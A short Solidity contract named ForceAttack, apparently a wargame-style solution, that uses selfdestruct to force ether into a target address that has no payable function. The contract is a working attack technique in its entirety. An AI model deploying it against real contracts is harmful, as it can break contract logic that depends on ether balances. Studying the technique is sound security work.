pragma solidity ^0.6.0;

contract ForceAttack {

  constructor() public payable {}
  receive() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
